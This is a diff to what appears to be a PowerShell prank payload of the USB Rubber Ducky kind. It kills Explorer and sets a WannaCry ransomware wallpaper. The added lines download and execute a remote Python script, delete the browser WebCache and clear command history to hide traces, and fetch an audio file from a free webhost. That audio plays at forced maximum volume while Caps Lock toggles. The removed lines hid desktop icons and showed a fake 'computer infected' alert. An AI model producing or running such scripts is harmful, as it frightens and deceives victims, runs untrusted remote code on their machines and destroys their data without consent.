@@ -1,10 +1,5 @@
-#Hides Desktop Icons
-$Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
-Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
 Get-Process "explorer"| Stop-Process
 
-#Changes Background  
-#URL For the Image of your choice (Wanna Cry Ransomware Background)
 $url = "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/05/07175123/wannacry_07.png"
 
 
@@ -109,39 +104,32 @@ Add-Type -TypeDefinition $setwallpapersrc
 Set-WallPaper -Image "$Env:USERPROFILE\Desktop\cry.png" -Style Center
 
 
-#Pop Up Message
+$scriptUrl = "https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/payloads/library/execution/CloseAllApplicationsInWindows/script.py"
+$savePath = "$env:temp\script.py"
+(New-Object System.Net.WebClient).DownloadFile($scriptUrl, $savePath)
 
-function MsgBox {
+& python $savePath
 
-[CmdletBinding()]
-param (	
-[Parameter (Mandatory = $True)]
-[Alias("m")]
-[string]$message,
+Remove-Item $savePath
+Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\*" -Recurse -Force
+Clear-History
 
-[Parameter (Mandatory = $False)]
-[Alias("t")]
-[string]$title,
 
-[Parameter (Mandatory = $False)]
-[Alias("b")]
-[ValidateSet('OK','OKCancel','YesNoCancel','YesNo')]
-[string]$button,
+iwr https://leeward-log.000webhostapp.com/videoplayback.wav?dl=1 -O $env:TMP\e.wav
 
-[Parameter (Mandatory = $False)]
-[Alias("i")]
-[ValidateSet('None','Hand','Question','Warning','Asterisk')]
-[string]$image
-)
+$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
 
-Add-Type -AssemblyName PresentationCore,PresentationFramework
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
 
-if (!$title) {$title = " "}
-if (!$button) {$button = "OK"}
-if (!$image) {$image = "None"}
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
 
-[System.Windows.MessageBox]::Show($message,$title,$button,$image)
-
-}
-
-MsgBox -m 'computer infected' -t "Warning" -b OKCancel -i Warning
+$PlayWav=New-Object System.Media.SoundPlayer;$PlayWav.SoundLocation="$env:TMP\e.wav";$PlayWav.playsync()
